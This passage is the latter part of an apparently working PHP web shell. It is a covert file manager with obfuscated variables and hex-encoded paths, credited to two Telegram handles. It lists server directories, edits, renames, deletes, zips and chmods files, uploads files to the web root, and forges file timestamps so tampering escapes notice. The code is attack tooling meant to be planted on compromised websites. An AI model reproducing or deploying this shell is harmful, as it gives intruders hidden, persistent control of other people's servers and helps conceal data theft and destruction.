					".serverInfo()."<br>";$i18=str_replace("\\",'/',$i18);$p62=explode("/",$i18);echo "Current Dir : ";foreach($p62 as $o48=>$f49){echo "<a href=\"javascript:get('";for($o63=0;$o63<=$o48;$o63++){echo bin2hex($p62[$o63]);if($o63!=$o48){echo bin2hex("/");}}echo"');\">{$f49}/</a>";}echo "</div></th></tr><tr>";echo "<th class=\"head\" style=\"border-right: 3px solid #444;\" colspan=\"2\">Filename</th>";echo "<th class=\"head\" style=\"border-right: 3px solid #444;\">Size</th>";echo "<th class=\"head\" style=\"border-right: 3px solid #444;\">Permissions</th>";echo "<th class=\"head\" style=\"border-right: 3px solid #444;\">Owner/Group</th>";echo "<th class=\"head\" style=\"border-right: 3px solid #444;\">Modify</th>";echo "<th class=\"head\">Action</th>";echo "</thead>";echo "<tbody>";foreach(listFiles($i18,"dir")as $o48=>$f49){$f64=getOwnership($f49[0]);@$d33=$f64['user'];@$n32=$f64['group'];$t65=$i18."/".$f49[1];$t65=str_replace("\\","/",$t65);echo "
			<tr class=\"hover\">
				<td class=\"td-icon\" />
					<input class=\"checkbox\" type=\"checkbox\" name=\"dataFile[]\" value=\"".bin2hex($t65)."\">
					<img class=\"icon\" src=\"".getIcon($f49[0])."\"></td>
				<td class=\"td-files\" /><a href=\"javascript:get('".bin2hex($t65)."');\"><div class\"sortname\">".$f49[1]."</div></a></td>
				<td class=\"td-size\" />DIR</td>
				<td class=\"td-permission\" />
					<a href=\"javascript:action('".bin2hex($t65)."', 'changeMode')\">".wr($f49[0],getPermission($f49[0]))."</a>
				</td>
				<td class=\"td-owner\" />".$d33." : ".$n32."</td>
				<td class=\"td-last\" />".getFilemtime($f49[0])."</td>
				<td class=\"td-action\" />
					<a class=\"button \" href=\"javascript:action('".bin2hex($t65)."', 'rename');\" title=\"Rename\" />R</a>
					<a class=\"button button_warning\" href=\"javascript:action('".bin2hex($t65)."', 'chdatetime');\" title=\"Changet Date & Time\" />T</a>
					<a class=\"button button_danger\" href=\"javascript:action('".bin2hex($t65)."', 'delete');\" title=\"Delete\" />X</a>
				</td>
			</tr>";}foreach(listFiles($i18,"file")as $o48=>$f49){$f64=getOwnership($f49[0]);@$d33=$f64['user'];@$n32=$f64['group'];$t65=$i18."/".$f49[1];$t65=str_replace("\\","/",$t65);echo "
			<tr class=\"hover\">
			<td class=\"td-icon\">
					<input class=\"checkbox\" type=\"checkbox\" name=\"dataFile[]\" value=\"".bin2hex($t65)."\">
					<img class=\"icon\" src=\"".getIcon($f49[0])."\" /></td>
				<td class=\"td-files\" /><div class\"sortname\">".mySelf($f49[1])."</div></td>
				<td class=\"td-size\" />".getFileSize($f49[0])."</td>
				<td class=\"td-permission\" />
					<a href=\"javascript:action('".bin2hex($t65)."', 'changeMode')\">".wr($f49[0],getPermission($f49[0]))."</a>
				</td>
				<td class=\"td-owner\" />".$d33." : ".$n32."</td>
				<td class=\"td-last\" />".getFilemtime($f49[0])."</td>
				<td class=\"td-action\" />
					<a class=\"button button_primary\" href=\"javascript:action('".bin2hex($t65)."', 'edit');\" title=\"Edit\" ".getExtImage($t65).">E</a>
					<a class=\"button\" href=\"javascript:action('".bin2hex($t65)."', 'rename');\" title=\"Rename\" />R</a>
					<a class=\"button button_warning\" href=\"javascript:action('".bin2hex($t65)."', 'chdatetime');\" title=\"Changet Date & Time\" />T</a>
					<a class=\"button button_danger\" href=\"javascript:action('".bin2hex($t65)."', 'delete');\" title=\"Delete\" />X</a>
				</td>
			</tr>";}echo "</tbody>
		</table>";echo "<div class=\"divSelect\">
				<select name=\"massAction\">
					<option selected>Choose</option>
					<option value=\"1\">Delete</option>
					<option value=\"2\">Compress Zip</option>
				</select>

				<input class=\"button button_primary\" type=\"submit\"name=\"massSubmit\">
			</div>";echo "<input type=\"hidden\" name=\"path\" id=\"path\" value=\"".bin2hex($i18)."\"/>
		  <input type=\"hidden\" name=\"action\" id=\"action\" value=\"get\" />
	</form>";}if(isset($_POST['massSubmit'])){$x57=$_POST['dataFile'];foreach($x57 as $f49){switch($_POST['massAction']){case '1':if(delete(hex2bin($f49))){echo alert(count($x57)." object deleted","success");}else{echo alert("error");}break;case '2':if(zip(hex2bin($f49),cwd()."/".date("dmy_h-i").".zip")){echo alert(basename(date("dmy_h-i").".zip Compressed to zip"),"success");}else{alert("error");}break;}}}if(isset($_POST['uploadFileSubmit'])){$g46=$_POST['type'];$e58=$_SERVER['DOCUMENT_ROOT'];$y66=hex2bin($_POST['path']);switch($g46){case 'rootDir':uploadFile($e58);break;case 'currentDir':uploadFile($y66);break;}}if(isset($_POST['multiMakingFilesSubmit'])){$k29=$_POST['filename'];$i18=hex2bin($_POST['path']);$g46=$_POST['type'];foreach($k29 as $o48=>$f49){switch($g46){case 'file':touch($i18."/".$f49);break;case 'folder':mkdir($i18."/".$f49);break;}}}if(isset($_POST['action'])){if("logout"==$_POST['action']){logout();echo "<script>location.reload()</script>";}if("delete"==$_POST['action']){if(delete(hex2bin($_POST['path']))){echo "<script>location.reload()</script>";}else{echo alert("Deleted Failed","error");}die();}if("chdatetime"==$_POST['action']){if(file_exists(hex2bin($_POST['path']))){if(isset($_POST['submit'])){if(changeDateaTime(hex2bin($_POST['path']),$_POST['time'])){alert("Success !","success");}else{alert("Failed !","error");}}echo"<form action=\"\" method=\"post\" id=\"5hell\" />
				<table class=\"editPage\" width=\"100%\">
					<tbody>
						<tr>
							<td colspan=\"3\"><h1><a href=\"javascript: history.go(-{$_POST['no']});\" onclick=\"setTimeout(function(){window.location.reload();},10);\">&#8617;&nbsp;</a> ".(is_dir(hex2bin($_POST['path']))?"CHANGE DATE & TIME FOLDER":"CHANGE DATE & TIME FILE")."</h1>".@$k67."</td>
						</tr>
						".fileInfo(hex2bin($_POST['path']))."
						<tr>
							<td colspan=\"3\"><input type=\"text\" style=\"width:290px;\" name=\"time\" value=\"".getFilemtime(hex2bin($_POST['path']))."\" /></td>
						</tr>
						<tr>
							<td colspan=\"3\"><input type=\"submit\" class=\"button button_primary\" name=\"submit\" value=\"Change\" /></td>
						</tr>
						<tr>
							<input type=\"hidden\" name=\"path\" value=\"".$_POST['path']."\" />
							<input type=\"hidden\" name=\"no\" value=\"2\" />
							<input type=\"hidden\" name=\"action\" id=\"action\" value=\"chdatetime\" />
						</tr>
					</tbody>
				</table>";echo "</form>";}die();}if("changeMode"==$_POST['action']){if(file_exists(hex2bin($_POST['path']))){if(isset($_POST['submit'])){if(chmod(hex2bin($_POST['path']),$_POST['mode'])){changeDateaTime(hex2bin($_POST['path']),hex2bin($_POST['time']));alert("Success !","success");}else{alert("Failed !","error");}}echo "<form action=\"\" method=\"post\" id=\"5hell\" />
				<table class=\"editPage\" width=\"100%\">
					<tbody>
						<tr>
							<td colspan=\"3\"><h1><a href=\"javascript: location.reload()\">&#8617;&nbsp;</a> ".(is_dir(hex2bin($_POST['path']))?"CHANGE MODE FOLDER":"CHANGE MODE FILE")."</h1></td>
						</tr>
						".fileInfo(hex2bin($_POST['path']))."
						<tr>
							<td colspan=\"3\"><input type=\"text\" style=\"width:290px;\" name=\"mode\" value=\"".getPermission(hex2bin($_POST['path']))."\" /></td>
						</tr>
						<tr>
							<td colspan=\"3\"><input type=\"submit\" class=\"button button_primary\" name=\"submit\" value=\"Change\" /></td>
						</tr>
						<tr>
							<input type=\"hidden\" name=\"path\" value=\"".$_POST['path']."\" />
							<input type=\"hidden\" name=\"time\" value=\"".bin2hex(getFilemtime(hex2bin($_POST['path'])))."\" />
							<input type=\"hidden\" name=\"no\" value=\"2\" />
							<input type=\"hidden\" name=\"action\" id=\"action\" value=\"changeMode\" />
						</tr>
					</tbody>
				</table>";echo "</form>";}die();}if("rename"==$_POST['action']){$f5=hex2bin($_POST['path']);if(file_exists($f5)&&is_writable($f5)){if(isset($_POST['submit'])){if(rename($f5,dirname($f5)."/".$_POST['newname'])){changeDateaTime($f5,hex2bin($_POST['time']));delete($f5);alert("Success !","success");}else{alert("Failed !","error");}}echo "<form action=\"\" method=\"post\" id=\"5hell\" />
				<table class=\"editPage\" width=\"100%\">
					<tbody>
						<tr>
							<td colspan=\"3\"><h1><a href=\"javascript: location.reload()\">&#8617;&nbsp;</a> ".(is_dir(hex2bin($_POST['path']))?"RENAME FOLDER":"RENAME FILE")."</h1></td>
						</tr>
						".fileInfo(hex2bin($_POST['path']))."
						<tr>
							<td colspan=\"3\"><input type=\"text\" style=\"width:290px;\" name=\"newname\" value=\"".basename(hex2bin($_POST['path']))."\" /></td>
						</tr>
						<tr>
							<td colspan=\"3\"><input type=\"submit\" class=\"button button_primary\" name=\"submit\" value=\"rename\" /></td>
						</tr>
						<tr>
							<input type=\"hidden\" name=\"path\" value=\"".$_POST['path']."\" />
							<input type=\"hidden\" name=\"time\" value=\"".bin2hex(getFilemtime(hex2bin($_POST['path'])))."\" />
							<input type=\"hidden\" name=\"no\" value=\"2\" />
							<input type=\"hidden\" name=\"action\" id=\"action\" value=\"rename\" />
						</tr>
					</tbody>
				</table>";echo "</form>";}die();}if("edit"==$_POST['action']){if(file_exists(hex2bin($_POST['path']))){if(isset($_POST['submit'])){if(writeFile(hex2bin($_POST['path']),$_POST['content'])){changeDateaTime(hex2bin($_POST['path']),hex2bin($_POST['time']));alert("Success !","success");}else{alert("Failed !","error");}}echo "<form action=\"\" method=\"post\" id=\"5hell\" />
				<table class=\"editPage\" width=\"100%\">
					<tbody>
						<tr>
							<td colspan=\"3\"><h1><a href=\"javascript: location.reload()\">&#8617;&nbsp;</a> EDIT FILE</h1></td>
						</tr>
						".fileInfo(hex2bin($_POST['path']))."
						<tr>
							<td colspan=\"3\"><input type=\"submit\" style=\"width:180px\" class=\"button button_primary\" name=\"submit\" value=\"Save\" /></td>
						</tr>
						<tr>
							<td colspan=\"3\"><textarea name=\"content\" />".htmlspecialchars(openFile(hex2bin($_POST['path'])))."</textarea></td>
						</tr>
						<tr>
							<input type=\"hidden\" name=\"path\" value=\"".$_POST['path']."\" />
							<input type=\"hidden\" name=\"time\" value=\"".bin2hex(getFilemtime(hex2bin($_POST['path'])))."\" />
							<input type=\"hidden\" name=\"no\" value=\"2\" />
							<input type=\"hidden\" name=\"action\" id=\"action\" value=\"edit\" />
						</tr>
					</tbody>
				</table>";echo "</form>";}die();}}$_POST['path']=isset($_POST['path'])?$_POST['path']:bin2hex(cwd());viewFiles(hex2bin($_POST['path']));setEncodedCookie("cwd",hex2bin($_POST['path']));?>
<script type="text/javascript">
function get(p){
     document.getElementById('path').value = p;
     document.getElementById('action').value = "get";
     document.getElementById('5hell').submit();
}
function action(file, act){
	document.getElementById("path").value = file;
     document.getElementById('action').value = act;
     document.getElementById('5hell').submit();
}

function set_cookie(key, value){
	document.cookie = key + '=' + encodeURIComponent(value);
}

let menuIcon = document.querySelector('.menuIcon');
let nav = document.querySelector('.overlay-menu');

menuIcon.addEventListener('click', () => {
	if (nav.style.transform != 'translateX(0%)') {
		nav.style.transform = 'translateX(0%)';
		nav.style.transition = 'transform 0.2s ease-out';
	} else {
		nav.style.transform = 'translateX(-100%)';
		nav.style.transition = 'transform 0.2s ease-out';
	}
});

let toggleIcon = document.querySelector('.menuIcon');

toggleIcon.addEventListener('click', () => {
	if (toggleIcon.className != 'menuIcon toggle') {
		toggleIcon.className += ' toggle';
	} else {
		toggleIcon.className = 'menuIcon';
	}
});

$(function() {
        const rowsPerPage = 30;
        const rows = $('#my-table tbody tr');
        const rowsCount = rows.length;
        const pageCount = Math.ceil(rowsCount / rowsPerPage);
        const numbers = $('#numbers');

        for (var i = 0; i < pageCount; i++) {
            numbers.append('<li><a href="#">' + (i + 1) + '</a></li>');
        }

        $('#numbers li:first-child a').addClass('active');
        displayRows(1);
        $('#numbers li a').click(function(e) {
            var $this = $(this);

            e.preventDefault();
            $('#numbers li a').removeClass('active');
            $this.addClass('active');
            displayRows($this.text());
        });

        function displayRows(index) {
            var start = (index - 1) * rowsPerPage;
            var end = start + rowsPerPage;
            rows.hide();
            rows.slice(start, end).show();
        }
    });
$(document).ready(function(){
  $('#dropDown').click(function(){
    $('.drop-down').toggleClass('drop-down--active');
  });
});

var max_fields = 10;
var x = 1;
$(document).on('click', '#add_input', function(e){
	if(x < max_fields){
		x++;
		$('#output').append('<div id=\"out\"><input type=\"text\" name=\"filename[]\" placeholder=\"filename\"></div>');
	}
	$('#output').on("click",".remove", function(e){
		e.preventDefault(); $(this).parent('#out').remove(); x--;
		repeat();
	})
});
</script>
<section class="contact-area" id="contact">
	<div class="pagination">
		<ol id="numbers"></ol>
	</div>
	<div class="contact-social">
		<ul>
			<li>
				<div class="makeFile">
					<h4>MAKE FILE & FOLDER</h4>
					<form method="post">
						<div class="makeCenter">
							<input type="radio" name="type" value="file" checked> File
							<input type="radio" name="type" value="folder"> Folder<br>
							<input style="width:71%;" type="text" name="filename[]" placeholder="filename">
							<input type="hidden" name="path" value="<?=$_POST['path']?>">
							<a style="border:none;color:#fff;" class="button button_primary" id="add_input">add</a><br>
							<div id="output"></div>
							<input class="button button_primary" type="submit" name="multiMakingFilesSubmit">
						</div>
					</form>
				</div>
			</li>
			<li>
				<div class="makeFile">
					<h4>UPLOAD FILE</h4>
					<form method="post" enctype="multipart/form-data">
						<div class="makeCenter">
							<input type="radio" name="type" value="rootDir"> Root (<?=wr($_SERVER['DOCUMENT_ROOT'],"writeable")?>)
							<input type="radio" name="type" value="currentDir" checked> Current Dir (<?=wr(hex2bin($_POST['path']),"writeable")?>)
							<br>
							<input type="hidden" name="path" value="<?=$_POST['path']?>">
							<input type="file" name="file[]" multiple>
							<input class="button button_primary" type="submit" name="uploadFileSubmit">
						</div>
					</form>
				</div>
			</li>
		</ul>
	</div>
</section>
<footer>
    <p>Cop.yright &copy; 2022-<?=@date("Y")?>  <a href="https://t.me/dutchmaan" target="_blank">sponge808</a> x <a href="https://t.me/Cvar1984" target="_blank">Cvar1984</a> All Rights Reserved.</p>
</footer>
<?php ob_end_flush();